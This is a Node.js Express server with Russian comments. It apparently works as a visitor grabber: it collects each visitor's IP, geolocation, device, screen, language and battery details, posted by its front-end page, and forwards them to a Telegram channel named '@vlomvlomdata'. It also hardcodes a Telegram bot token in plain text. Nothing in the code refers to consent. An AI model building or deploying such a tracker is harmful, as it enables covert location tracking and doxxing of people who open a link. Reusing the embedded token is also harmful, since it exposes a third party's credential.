const express = require('express');
const axios = require('axios');
const app = express();

const TOKEN = '7172780195:AAEh62mIlTEn5raF9oW94HKOzp23Rtk1R2M'; // Убедись, что тут твой токен
const CHANNEL = '@vlomvlomdata'; // Убедись, что тут твой канал

app.use(express.static('public'));
app.use(express.json());

// Функция для получения страны по IP
async function getCountryByIp(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        if (response.data.status === 'success') {
            return {
                country: response.data.country,
                countryCode: response.data.countryCode
            };
        }
        return { country: 'Неизвестно', countryCode: null };
    } catch (error) {
        console.log('Ошибка при получении страны:', error.message);
        return { country: 'Неизвестно', countryCode: null };
    }
}

// Функция для преобразования кода страны в эмодзи флага
function getFlagEmoji(countryCode) {
    if (!countryCode) return '';
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

// Функция для определения устройства из User-Agent
function parseDevice(userAgent) {
    let deviceType = 'Desktop';
    let deviceName = 'Unknown';

    if (/mobile/i.test(userAgent)) {
        deviceType = 'Mobile';
    } else if (/tablet/i.test(userAgent)) {
        deviceType = 'Tablet';
    }

    if (/iphone/i.test(userAgent)) {
        deviceName = 'iPhone';
    } else if (/ipad/i.test(userAgent)) {
        deviceName = 'iPad';
    } else if (/android/i.test(userAgent)) {
        deviceName = 'Android';
    } else if (/windows/i.test(userAgent)) {
        deviceName = 'Windows PC';
    } else if (/macintosh|mac os x/i.test(userAgent)) {
        deviceName = 'Mac';
    }

    return `${deviceName} (${deviceType})`;
}

app.post('/data', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { userAgent, time, geolocation, screenResolution, language, battery } = req.body;

    // Получаем страну по IP
    const { country, countryCode } = await getCountryByIp(ip);
    const flag = getFlagEmoji(countryCode);

    // Определяем устройство
    const device = parseDevice(userAgent);

    // Форматируем сообщение
    const message = `🔔 Новый посетитель!\n` +
        `🌍 Страна: ${country} ${flag}\n` +
        `🕒 Время: ${time}\n` +
        `📱 Устройство: ${device}\n` +
        `🌐 IP: ${ip}\n` +
        `🖥️ Разрешение экрана: ${screenResolution}\n` +
        `🗣️ Язык: ${language}\n` +
        `🔋 Батарея: ${battery || 'Не предоставлена'}`;

    try {
        await axios.get(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            params: {
                chat_id: CHANNEL,
                text: message
            }
        });
    } catch (error) {
        console.log('Пиздец, ошибка', error.message);
    }

    res.send('ok');
});

const port = process.env.PORT || 10000;
app.listen(port, () => console.log(`Пашет на порту ${port}`));